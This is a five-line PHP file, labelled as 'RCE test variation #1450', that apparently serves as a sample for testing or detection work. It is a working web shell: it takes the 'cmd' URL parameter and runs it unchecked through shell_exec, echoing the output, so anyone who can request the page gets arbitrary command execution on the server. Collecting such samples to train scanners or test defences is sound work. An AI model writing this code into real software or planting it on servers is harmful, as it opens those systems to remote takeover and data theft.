<?php
// RCE test variation #1450
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>